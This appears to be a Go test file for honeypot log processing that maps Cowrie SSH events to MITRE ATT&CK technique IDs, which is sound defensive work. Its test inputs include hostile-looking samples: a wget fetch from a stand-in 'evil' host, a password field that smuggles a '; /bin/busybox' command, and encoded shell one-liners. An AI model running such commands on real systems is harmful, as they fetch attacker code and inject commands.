package main

import "testing"

func TestPromoteAttckTechniqueFieldsCreds(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.login.failed", "username": "root", "password": "arris"}
	if !promoteCanonicalFields("cowrie", e) {
		t.Fatal("expected canonical fields to be promoted first")
	}
	if !promoteAttckTechniqueFields(e) {
		t.Fatal("expected a change")
	}
	ids, _ := e["canonical_attck_techniques"].([]string)
	if len(ids) != 1 || ids[0] != "T1110" {
		t.Fatalf("got %v", ids)
	}
}

func TestPromoteAttckTechniqueFieldsNoCredsWhenPairInvalid(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.login.failed", "username": "root", "password": "; /bin/busybox"}
	promoteCanonicalFields("cowrie", e)
	if _, ok := e["canonical_user"]; ok {
		t.Fatalf("test setup invalid: expected canonical_user unset, got %+v", e)
	}
	if promoteAttckTechniqueFields(e) {
		t.Fatalf("expected no change, no valid creds were promoted: %+v", e)
	}
}

func TestPromoteAttckTechniqueFieldsCommandSubclasses(t *testing.T) {
	cases := []struct {
		command string
		want    string
	}{
		{"powershell -enc AAA", "T1059.001"},
		{"pwsh -c whoami", "T1059.001"},
		{"cmd.exe /c whoami", "T1059.003"},
		{"cmd /c whoami", "T1059.003"},
		{"/bin/sh -c id", "T1059.004"},
		{"bash -c id", "T1059.004"},
		{"echo hi", "T1059"},
	}
	for _, c := range cases {
		e := map[string]any{"eventid": "cowrie.command.input", "input": c.command}
		promoteCanonicalFields("cowrie", e)
		if !promoteAttckTechniqueFields(e) {
			t.Fatalf("%q: expected a change", c.command)
		}
		ids, _ := e["canonical_attck_techniques"].([]string)
		found := false
		for _, id := range ids {
			if id == c.want {
				found = true
			}
		}
		if !found {
			t.Fatalf("%q: expected %s in %v", c.command, c.want, ids)
		}
	}
}

func TestPromoteAttckTechniqueFieldsIngressToolTransferFromShasum(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.session.file_download", "shasum": "deadbeefdeadbeefdeadbeefdeadbeef"}
	promoteCanonicalFields("cowrie", e)
	if !promoteAttckTechniqueFields(e) {
		t.Fatal("expected a change")
	}
	ids, _ := e["canonical_attck_techniques"].([]string)
	if len(ids) != 1 || ids[0] != "T1105" {
		t.Fatalf("got %v", ids)
	}
}

func TestPromoteAttckTechniqueFieldsIngressToolTransferFromCommandKeyword(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.command.input", "input": "wget http://evil/x -O /tmp/x"}
	promoteCanonicalFields("cowrie", e)
	if !promoteAttckTechniqueFields(e) {
		t.Fatal("expected a change")
	}
	ids, _ := e["canonical_attck_techniques"].([]string)
	if len(ids) != 2 {
		t.Fatalf("expected both a command technique and T1105, got %v", ids)
	}
	var hasT1105 bool
	for _, id := range ids {
		hasT1105 = hasT1105 || id == "T1105"
	}
	if !hasT1105 {
		t.Fatalf("expected T1105 in %v", ids)
	}
}

func TestPromoteAttckTechniqueFieldsActiveScanning(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.client.version", "version": "SSH-2.0-libssh2"}
	promoteCanonicalFields("cowrie", e)
	if !promoteAttckTechniqueFields(e) {
		t.Fatal("expected a change")
	}
	ids, _ := e["canonical_attck_techniques"].([]string)
	if len(ids) != 1 || ids[0] != "T1595" {
		t.Fatalf("got %v", ids)
	}
}

func TestPromoteAttckTechniqueFieldsActiveScanningSuppressedByCommand(t *testing.T) {
	// A fingerprint riding alongside an actual command shouldn't also
	// claim "active scanning" -- matches techniquesForEvent's own
	// `e.Fingerprint != "" && e.Command == "" && !e.IsLogin` gate.
	e := map[string]any{"eventid": "cowrie.command.input", "input": "id"}
	promoteCanonicalFields("cowrie", e)
	e["canonical_fingerprint"], e["canonical_fingerprint_kind"] = "SSH-2.0-libssh2", "SSH client"
	if !promoteAttckTechniqueFields(e) {
		t.Fatal("expected a change (command technique)")
	}
	ids, _ := e["canonical_attck_techniques"].([]string)
	for _, id := range ids {
		if id == "T1595" {
			t.Fatalf("did not expect T1595 alongside a command technique: %v", ids)
		}
	}
}

func TestPromoteAttckTechniqueFieldsNoSignalNoChange(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.session.connect"}
	promoteCanonicalFields("cowrie", e)
	if promoteAttckTechniqueFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
	if _, ok := e["canonical_attck_techniques"]; ok {
		t.Fatalf("did not expect the field to be set: %+v", e)
	}
}

func TestUniqueAttckIDsDedupes(t *testing.T) {
	got := uniqueAttckIDs([]string{"T1105", "T1110", "T1105"})
	if len(got) != 2 || got[0] != "T1105" || got[1] != "T1110" {
		t.Fatalf("got %v", got)
	}
}
